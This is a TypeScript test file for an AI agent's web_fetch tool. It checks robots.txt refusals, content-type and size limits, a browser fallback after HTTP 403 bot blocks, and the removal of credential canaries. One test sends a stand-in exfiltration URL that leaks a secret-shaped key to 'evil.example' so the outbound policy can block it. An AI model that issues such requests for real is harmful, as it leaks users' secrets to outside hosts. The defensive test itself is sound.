import { mkdtemp, readdir, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { EthicsRefusedError, FetchError, HybridContentFetcher } from '@yantra/core';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { webFetchSpec } from '../../../../src/adapters/pi/tools/web-fetch.js';
import { wrapTool } from '../../../../src/runtime/middleware.js';

import {
  buildServices,
  extractorReturning,
  fetchedDoc,
  fetcherReturning,
  refusingEthics,
} from './test-support.js';

const CANARY = 'sk-FETCHCANARYabcdefghijklmnop';

describe('@no-llm web_fetch tool', () => {
  let runDir: string;

  beforeEach(async () => {
    runDir = await mkdtemp(join(tmpdir(), 'yantra-fetch-'));
  });
  afterEach(async () => {
    await rm(runDir, { recursive: true, force: true });
  });

  it('fetches, extracts, and returns bounded readable text', async () => {
    const services = buildServices({
      runDir,
      fetch: {
        fetcher: fetcherReturning(fetchedDoc()),
        extractor: extractorReturning('The quick brown fox jumps over the lazy dog.'),
      },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
    expect(result.status).toBe('ok');
    expect(result.modelText).toContain('quick brown fox');
  });

  it('refuses a robots-blocked host with a typed refusal (no evasion path)', async () => {
    const refusal = new EthicsRefusedError(
      {
        host: 'example.com',
        rule: 'robots.txt',
        reason: 'Disallowed by robots.txt',
        source: 'robots',
      },
      { taskId: 't', runId: 'r', stepId: 'web_fetch' },
    );
    const services = buildServices({ runDir, fetch: { ethics: refusingEthics(refusal) } });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
    expect(result.status).toBe('error');
    expect(result.error_code).toBe('ETHICS_BLOCKED');
    expect(result.retryable).toBe(false);
  });

  it('refuses a non-text content type', async () => {
    const services = buildServices({
      runDir,
      fetch: { fetcher: fetcherReturning(fetchedDoc({ contentType: 'application/pdf' })) },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a.pdf' }, undefined);
    expect(result.error_code).toBe('CONTENT_TYPE_REFUSED');
  });

  it('maps an over-size fetch to CONTENT_TOO_LARGE', async () => {
    const services = buildServices({
      runDir,
      fetch: {
        fetcher: {
          fetch: () =>
            Promise.reject(
              new FetchError('too big', { url: 'https://example.com/a', kind: 'too-large' }),
            ),
        },
      },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
    expect(result.error_code).toBe('CONTENT_TOO_LARGE');
  });

  it('returns EXTRACTION_EMPTY with next-step guidance when no article extracts', async () => {
    const services = buildServices({
      runDir,
      fetch: { fetcher: fetcherReturning(fetchedDoc()), extractor: extractorReturning(null) },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/hub' }, undefined);
    expect(result.status).toBe('error');
    expect(result.error_code).toBe('EXTRACTION_EMPTY');
    expect(result.retryable).toBe(false);
    // The message must steer the agent to a different URL, not a blind retry.
    expect(result.modelText).toMatch(/article URL/i);
  });

  it('recovers a bot-refused fetch through the hybrid browser fallback (401/403 class)', async () => {
    const refusingHttp = {
      fetch: () =>
        Promise.reject(
          new FetchError('HTTP 403 while fetching content.', {
            url: 'https://example.com/a',
            kind: 'http-status',
            statusCode: 403,
          }),
        ),
    };
    const services = buildServices({
      runDir,
      fetch: {
        fetcher: new HybridContentFetcher({
          httpFetcher: refusingHttp,
          browserFetcher: fetcherReturning(fetchedDoc({ fetchMode: 'browser' })),
        }),
        extractor: extractorReturning('Rendered article content recovered via browser.'),
      },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
    expect(result.status).toBe('ok');
    expect(result.modelText).toContain('Rendered article content recovered via browser.');
  });

  it('rejects a URL that fails the outbound policy with a stable code', async () => {
    const services = buildServices({ runDir });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute(
      { url: 'https://evil.example/x?leak=sk-ABCDEFGHIJKLMNOPQRSTUVWX' },
      undefined,
    );
    expect(result.status).toBe('error');
    expect(result.error_code).toBe('URL_CREDENTIAL_SHAPE');
  });

  it('sanitizes credential canaries out of extracted content', async () => {
    const services = buildServices({
      runDir,
      fetch: {
        fetcher: fetcherReturning(fetchedDoc()),
        extractor: extractorReturning(`the api key is ${CANARY} in the body`),
      },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
    expect(result.modelText).not.toContain(CANARY);
  });

  it('stores large content as a capture reference instead of inline', async () => {
    const big = 'lorem ipsum '.repeat(5000);
    const services = buildServices({
      runDir,
      fetch: {
        fetcher: fetcherReturning(fetchedDoc()),
        extractor: extractorReturning(big),
        captureThresholdBytes: 1024,
      },
    });
    const tool = wrapTool(webFetchSpec(services), services);
    const result = await tool.execute({ url: 'https://example.com/a' }, undefined);
    expect(result.status).toBe('ok');
    const payload = JSON.parse(result.modelText) as { capture_ref?: string };
    expect(payload.capture_ref).toMatch(/^cap-/);
    const files = await readdir(join(runDir, 'captures'));
    expect(files.length).toBe(1);
  });
});
